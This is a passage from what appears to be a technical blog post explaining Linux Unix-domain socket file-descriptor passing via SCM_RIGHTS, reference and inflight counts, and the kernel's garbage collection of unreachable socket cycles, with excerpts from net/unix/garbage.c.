 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7JYdav9RAoJLT1TJAAfsVJ6kudGtVBqb8V8Xs0DjEVDEfouQv3SX06oh4AmpRx8UrMNnjqhe0i0FYB6c2jjNtiwGSa1LpHSsg-0AI270tzyX2ziVEHuOO69qTIYhjj780S0oMvXfrdAuyNImJYtBfZ8oUV869w62NV5wshFX3cM0hpmPW219HZT3u/s756/image64.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7JYdav9RAoJLT1TJAAfsVJ6kudGtVBqb8V8Xs0DjEVDEfouQv3SX06oh4AmpRx8UrMNnjqhe0i0FYB6c2jjNtiwGSa1LpHSsg-0AI270tzyX2ziVEHuOO69qTIYhjj780S0oMvXfrdAuyNImJYtBfZ8oUV869w62NV5wshFX3cM0hpmPW219HZT3u/s756/image64.png" border="0" alt="When the file descriptor A sends itself to the file descriptor B, the reference count of the file descriptor A is 2 and the inflight count is 1. For the receiver file descriptor B, the file reference count is 1 and the inflight count is 0." style="max-height: 750px; max-width: 600px;"title="When the file descriptor A sends itself to the file descriptor B, the reference count of the file descriptor A is 2 and the inflight count is 1. For the receiver file descriptor B, the file reference count is 1 and the inflight count is 0." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">The inflight count of </span><span class="ykcrMYlEiJ-c8">A</span><span class="c34 c19 c32">&nbsp;is incremented</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>When the socket file descriptor is received from the other side, the </span><span class="ykcrMYlEiJ-c3">unix_sock.inflight</span><span class="ykcrMYlEiJ-c2">&nbsp;count will be decremented.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Let&rsquo;s revisit the reference count cycle scenario before the close syscall. </span><span>This cycle is breakable because any socket files can receive the transmitted file and break the reference cycle:</span><span class="ykcrMYlEiJ-c32">&nbsp;</span></p>
 <p class="c31 c20 c48"></p>
 <p class="c31 c20 c48"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXASWOd1HPgwueBa5J636vqpj3uP4onThAwMEL0K_ZBBh3mUr5WklN_YPLIYzXaKl2aSpzcf_odw0ymXe-k7wewgh592dQfkj8AYn6r4jHVh6TXpML2-zsCyFt6ZjmR8N-hcyCeHIwVDjtgCGuRU-YfulCdMk5GWTu9h7X8N7iuCV7GXkzLOKEwFy9/s704/image70.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXASWOd1HPgwueBa5J636vqpj3uP4onThAwMEL0K_ZBBh3mUr5WklN_YPLIYzXaKl2aSpzcf_odw0ymXe-k7wewgh592dQfkj8AYn6r4jHVh6TXpML2-zsCyFt6ZjmR8N-hcyCeHIwVDjtgCGuRU-YfulCdMk5GWTu9h7X8N7iuCV7GXkzLOKEwFy9/s704/image70.png" border="0" alt="The file descriptor A sends itself to the file descriptor B and vice versa. The inflight count of the file descriptor A and B is both 1 and the file reference count is both 2." style="max-height: 750px; max-width: 600px;"title="The file descriptor A sends itself to the file descriptor B and vice versa. The inflight count of the file descriptor A and B is both 1 and the file reference count is both 2." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">Breakable cycle before close </span><span class="ykcrMYlEiJ-c8">A</span><span class="ykcrMYlEiJ-c32">&nbsp;and </span><span class="ykcrMYlEiJ-c8">B</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">After closing both of the file descriptors, the reference count equals the inflight count for each of the socket file descriptors, which is a sign of possible garbage:</span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiLYC-jGxNwF2UbjAZgIsusMaCUGbBo61ZVRxLljS27iXShVhfCth-_lXBBevW9hyWaIcKBWdkX_6BixTMWNDoE56ZrUFbiKLolrc8orEqPTp_0ITjwRfxUzJZwvaJZWkomMlkM-_Lqr1DdFQVKjnEW_nnuSOz51JCvu-xZDterJudPenVekqGpqP-/s700/image61.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiLYC-jGxNwF2UbjAZgIsusMaCUGbBo61ZVRxLljS27iXShVhfCth-_lXBBevW9hyWaIcKBWdkX_6BixTMWNDoE56ZrUFbiKLolrc8orEqPTp_0ITjwRfxUzJZwvaJZWkomMlkM-_Lqr1DdFQVKjnEW_nnuSOz51JCvu-xZDterJudPenVekqGpqP-/s700/image61.png" border="0" alt="The cycle becomes unbreakable after closing A and B. The reference count equals to the inflight count for A and B." style="max-height: 750px; max-width: 600px;"title="The cycle becomes unbreakable after closing A and B. The reference count equals to the inflight count for A and B." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">Unbreakable cycle after close </span><span class="ykcrMYlEiJ-c8">A</span><span class="ykcrMYlEiJ-c32">&nbsp;and </span><span class="ykcrMYlEiJ-c8">B</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Now, let&rsquo;s check another example. </span><span>Assume we have sockets </span><span class="ykcrMYlEiJ-c8">A</span><span>, </span><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c44">&#x1d6fc;</span><span>:</span></p><ol class="c27 lst-kix_9prd8pa3o8y7-0 start" start="1"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;to socket </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;to socket </span><span class="ykcrMYlEiJ-c8">A</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;to socket </span><span class="ykcrMYlEiJ-c44">&#x1d6fc;</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c44">&#x1d6fc;</span><span>&nbsp;sends socket </span><span class="ykcrMYlEiJ-c44">&#x1d6fc;</span><span>&nbsp;to socket </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Close </span><span class="ykcrMYlEiJ-c8">A</span><span class="ykcrMYlEiJ-c2">.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Close </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">.</span></li></ol>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnuMdkCyfn1Xhzr4NJiNcf3Oxt8ZB8kCVOZEIIVcuTGoHGEq37NFy44gE-wgNaaIZiwoSE0iWSpfifiXtfEMc0qec9_Lih7VE3xqzQJ6PjIGMT7K6Jcz0VLfYELIev025FXRJbnmnKHdChHBnk7DnjFQSRe0kB8k9zoXBP_ZYh7SYlCkQ08qHYhyxY/s1999/image68.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnuMdkCyfn1Xhzr4NJiNcf3Oxt8ZB8kCVOZEIIVcuTGoHGEq37NFy44gE-wgNaaIZiwoSE0iWSpfifiXtfEMc0qec9_Lih7VE3xqzQJ6PjIGMT7K6Jcz0VLfYELIev025FXRJbnmnKHdChHBnk7DnjFQSRe0kB8k9zoXBP_ZYh7SYlCkQ08qHYhyxY/s1200/image68.png" border="0" alt="A, B and alpha form a breakable cycle." style="max-height: 750px; max-width: 600px;"title="A, B and alpha form a breakable cycle." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c32">Breakable cycle for </span><span class="ykcrMYlEiJ-c8">A</span><span>, </span><span class="ykcrMYlEiJ-c8">B</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c32">and</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c15">&#x1d6fc;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The cycle is breakable, because </span><span>we can get newly installed file descriptor </span><span class="ykcrMYlEiJ-c8">B</span><span>&rsquo;</span><span>&nbsp;from the socket file descriptor </span><span class="ykcrMYlEiJ-c44">&#x1d6fc;</span><span>&nbsp;and newly installed file descriptor </span><span class="ykcrMYlEiJ-c8">A&#39;</span><span>&nbsp;from </span><span class="ykcrMYlEiJ-c8">B</span><span>&rsquo;.</span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.6bkr31v5bx7w"><span class="ykcrMYlEiJ-c1">Garbage Collection</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>A h</span><span>igh level view of garbage collection is available from </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://lwn.net/Articles/779472/">lwn.net</a></span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c38">&quot;</span><span class="c34 c19 c49 c38">If, instead, the two counts are equal, that file structure might be part of an unreachable cycle. To determine whether that is the case, the kernel finds the set of all in-flight Unix-domain sockets for which all references are contained in SCM_RIGHTS datagrams (for which f_count and inflight are equal, in other words). It then counts how many references to each of those sockets come from SCM_RIGHTS datagrams attached to sockets in this set. Any socket that has references coming from outside the set is reachable and can be removed from the set. If it is reachable, and if there are any SCM_RIGHTS datagrams waiting to be consumed attached to it, the files contained within that datagram are also reachable and can be removed from the set.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="c34 c19 c38 c49"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="c34 c19 c49 c38">At the end of an iterative process, the kernel may find itself with a set of in-flight Unix-domain sockets that are only referenced by unconsumed (and unconsumable) SCM_RIGHTS datagrams; at this point, it has a cycle of file structures holding the only references to each other. Removing those datagrams from the queue, releasing the references they hold, and discarding them will break the cycle.&quot;</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>To be more specific, the </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span class="ykcrMYlEiJ-c2">&nbsp;garbage collection system was developed in order to handle the unbreakable reference cycles. To identify which file descriptors are a part of unbreakable cycles:</span></p><ol class="c27 lst-kix_iptxq54yrrnf-0 start" start="1"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Add any </span><span class="ykcrMYlEiJ-c3">unix_sock</span><span>&nbsp;objects whose reference count equals its inflight count to the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span class="ykcrMYlEiJ-c2">&nbsp;list.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>Determine if the socket is referenced by any sockets outside of the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;list. If it is then it is reachable, remove it and any sockets it references from the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;list. </span><span class="ykcrMYlEiJ-c2">Repeat until no more reachable sockets are found.</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span>After this iterative process, only sockets who are solely referenced by other sockets within the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span class="ykcrMYlEiJ-c2">&nbsp;list are left. </span></li></ol>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Let&rsquo;s take a closer look at how this garbage collection process works. First, the kernel finds all the </span><span class="ykcrMYlEiJ-c3">unix_sock</span><span>&nbsp;objects whose reference counts equals their inflight count and puts them into the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;</span><span>list</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L242">garbage.c#L242)</a></span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.abfa5bba6c1c21ddf7addd07cef8c63ba518ddc9"></a><a id="t.8"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">list_for_each_entry_safe</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">next</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">gc_inflight_list</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;link</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">long</span><span class="ykcrMYlEiJ-c0">&nbsp;total_refs</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">long</span><span class="ykcrMYlEiJ-c0">&nbsp;inflight_refs</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; total_refs </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;file_count</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">.</span><span class="ykcrMYlEiJ-c0">sk_socket</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">file</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; inflight_refs </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;atomic_long_read</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">inflight</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">inflight_refs </span><span class="ykcrMYlEiJ-c10">&lt;</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c35">1</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">total_refs </span><span class="ykcrMYlEiJ-c10">&lt;</span><span class="ykcrMYlEiJ-c0">&nbsp;inflight_refs</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">total_refs </span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">==</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;inflight_refs</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list_move_tail</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">link</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">gc_candidates</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __set_bit</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIX_GC_CANDIDATE</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">gc_flags</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __set_bit</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIX_GC_MAYBE_CYCLE</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">gc_flags</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Next, the kernel removes any sockets that are referenced by other sockets outside of the current </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;list. To do this, the kernel invokes </span><span class="ykcrMYlEiJ-c3">scan_children</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L138">garbage.c#138</a></span><span>) along with the function pointer </span><span class="ykcrMYlEiJ-c3">dec_inflight</span><span>&nbsp;to iterate through each candidate&rsquo;s </span><span class="ykcrMYlEiJ-c3">sk-&gt;receive_queue</span><span>.</span><span>&nbsp;It decreases the inflight count for each of the passed file descriptors that are themselves candidates for garbage collection (</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L261">garbage.c#L261</a></span><span class="ykcrMYlEiJ-c2">):</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.fc28a79164e4bd7a8bdd4781c31aead0becb7e3a"></a><a id="t.9"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* Now remove all internal in-flight reference to children of</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* the candidates.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">list_for_each_entry</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">gc_candidates</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;link</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; scan_children</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;dec_inflight</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;NULL</span><span class="ykcrMYlEiJ-c10">);</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>After iterating through all the candidates, if a gc candidate still has a positive inflight count it means that it is referenced by objects outside of the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;list and therefore is reachable. These candidates should not be included in the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span class="ykcrMYlEiJ-c2">&nbsp;list so the related inflight counts need to be restored.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>To do this, the kernel will put the candidate to </span><span class="ykcrMYlEiJ-c3">not_cycle_list</span><span>&nbsp;instead and iterates through its receiver queue of each transmitted file in the </span><span class="ykcrMYlEiJ-c3">gc_candidates</span><span>&nbsp;</span><span>list</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/garbage.c#L281">garbage.c#L281</a></span><span>) and increments the inflight count back. The entire process is done recursively, i</span><span>n order for the garbage collection to avoid purging reachable sockets:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.361a83de28e804a554f56db20f03ccfb1d948e58"></a><a id="t.10"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* Restore the references for children of all candidates,</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* which have remaining references. &nbsp;Do this recursively, so</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* only those remain, which form cyclic references.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* Use a &quot;cursor&quot; link, to make the list traversal safe, even</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* though elements might be moved about.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">list_add</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">cursor</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">gc_candidates</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">while</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">cursor</span><span class="ykcrMYlEiJ-c10">.</span><span class="ykcrMYlEiJ-c14">next</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">!=</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">gc_candidates</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; u </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;list_entry</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">cursor</span><span class="ykcrMYlEiJ-c10">.</span><span class="ykcrMYlEiJ-c14">next</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sock</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;link</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c23">/* Move cursor to after the current position. */</span></p>
